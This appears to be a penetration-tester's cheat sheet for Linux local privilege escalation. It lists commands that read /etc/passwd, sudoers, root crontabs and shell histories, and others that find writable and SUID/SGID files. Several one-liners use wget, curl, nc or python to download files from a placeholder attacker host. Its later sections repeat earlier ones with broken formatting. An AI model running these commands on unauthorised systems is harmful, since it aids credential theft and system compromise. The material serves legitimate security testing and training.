# Linux - Local Privilege Escalation

### Recon

###### Initial recon

| Description | Command |
|-------------|---------|
| OS | cat /etc/*-release <br/>cat /etc/lsb-release |
| Kernel | uname -a <br/> cat /proc/version <br/> rpm -q kernel |
| Current user | id <br/>whoami |
| All users    | cat /etc/passwd |
| Super users | awk -F: '($3 == "0") {print}' /etc/passwd |
| Sudoers | cat /etc/sudoers <br/> sudo -l |

###### Home directories content

The users home directories may contain sensible information such as config files
or history files.    
The following commands can be used to display the content of the users home
directories:

```bash
# Home
ls -lah /home/*
ls -ahlR /home/
find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
tree -pugfai /home

# Histories
cat ~/.bash_history
cat ~/.nano_history
```

###### Installed programs

The installed programs should be reviewed for potential known
vulnerabilities.  
To review the installed programs of the target:

```bash
dpkg -l
apt list --installed
rpm -qa
ls -lah /usr/bin
ls -lah /usr/sbin
```

###### Scheduled tasks

Look for tasks running as root from script that you can modify:

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
cat /etc/cron*
cat /var/spool/cron/crontabs/root
```

###### Compilers/languages installed/supported

The supported languages may be levaraged to compile exploit against the
operating system / kernel.  
To find out which compilers / languages can be used:
```bash
# C / C++
find / -name gcc* 2>/dev/null
find / -name g++* 2>/dev/null
find / -name clang* 2>/dev/null

# Python
python --version
find / -name python* 2>/dev/null

# Ruby
ruby --version
find / -name ruby* 2>/dev/null

# Perl
perl --version
find / -name perl* 2>/dev/null

# PHP
php --version
find / -name php* 2>/dev/null
```

Writable files & directories

/dev/shm
/tmp
File
find / -perm -2 -type f 2>/dev/null
find / -type f \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null

Directory
find / -perm -2 -type d 2>/dev/null
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null


File transfer tools

wget / Curl / netcat / nc / Python
wget -O file http://<IP>:<PORT>t/filename
curl http://<IP>:<PORT>/filename > file
nc -l -p <PORT> > file
python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/file', 'file')"
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/file', 'file')"

See General Attack / File Transfer


Enum scripts

LinEnum.sh
unix-privesc-check
linuxprivchecker.py
Linux_Exploit_Suggester.pl

/opt/priv_esc/linux/


###### Files with the SUID Bit Set
find / -user root -perm -4000 -ls 2>/dev/null
find / -type f -user root -perm -4000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

Files with the SGID Bit Set
find / -user root -perm -2000 -ls 2>/dev/null
find / -type f -user root -perm -2000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

Both
find / -user root -perm -6000 -ls 2>/dev/null
find / -type f -user root -perm -6000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

Installed programs

dpkg -l
apt list --installed
rpm -qa
ls -lah /usr/bin
ls -lah /usr/sbin


Scheduled tasks

crontab -l
ls -lah /etc/ | grep cron
ls -lah /etc/cron*
ls -lah /var/spool/cron

cat /etc/cron.X/*
...


Histories

history
cat ~/.bash_history
cat ~/.nano_history
